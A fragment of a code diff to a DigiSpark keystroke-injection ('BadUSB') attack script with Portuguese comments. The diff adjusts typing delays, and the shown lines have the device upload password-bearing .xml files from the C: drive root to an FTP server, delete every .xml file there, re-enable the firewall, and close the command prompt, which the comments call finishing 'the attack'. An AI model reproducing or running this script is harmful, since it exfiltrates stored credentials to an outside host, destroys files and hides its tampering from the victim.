@@ -88,11 +88,11 @@ while (lled < 3) {
 //Pega os arquivos .xml com as senhas na raiz do "C:/" e encaminha para o FTP.
   DigiKeyboard.delay(50);
   DigiKeyboard.print("PUT ./*.xml");
-  DigiKeyboard.delay(58);
+  DigiKeyboard.delay(70);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
 //Finaliza a conexão FTP.
-  DigiKeyboard.delay(1270);
+  DigiKeyboard.delay(1570);
   DigiKeyboard.print("bye");
   DigiKeyboard.delay(62);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -100,19 +100,19 @@ while (lled < 3) {
 //Exclui os arquivos .xml na raiz do C: !!exclui todos os .XML da Raiz C:/ , use com cuidado!!
   DigiKeyboard.delay(150);
   DigiKeyboard.print("del *.xml");
-  DigiKeyboard.delay(50);
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
 //Reabilita o firewall.
-  DigiKeyboard.delay(238);
+  DigiKeyboard.delay(538);
   DigiKeyboard.print("netsh firewall set opmode mode=enable");
-  DigiKeyboard.delay(28);
+  DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
 //Fecha o CMD e conclui o ataque.
   DigiKeyboard.delay(182);
   DigiKeyboard.print("exit");
-  DigiKeyboard.delay(30);
+  DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(10);
 
